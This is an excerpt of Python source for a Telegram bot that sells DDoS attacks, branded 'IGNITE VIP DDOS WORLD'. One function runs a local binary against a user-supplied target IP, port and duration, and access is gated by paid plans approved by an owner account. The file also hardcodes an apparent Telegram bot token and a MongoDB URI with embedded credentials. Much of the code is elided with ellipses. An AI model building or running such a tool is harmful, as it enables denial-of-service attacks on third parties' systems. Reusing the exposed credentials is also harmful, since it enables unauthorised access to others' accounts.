...
TOKEN = '7604194353:AAEX7raphE0k04C11pfU5C2DWI71aNrX4eI'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = --1002482755516
CHANNEL_ID = --1002482755516
error_channel_id = --1002482755516
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./shailu {target_ip} {target_port} {duration} 200")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @IGNITE_OWNER_1.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @IGNITE_OWNER_1* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @IGNITE_OWNER_1* 🙏"  # Contact owner message
    else:
...
def owner_command(message):
    response = (
        ...
        "📩 **Telegram:** https://t.me/+JOBkhZyZR2hhYjhl\n\n"
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO IGNITE VIP DDOS WORLD!* 🎉\n\n"
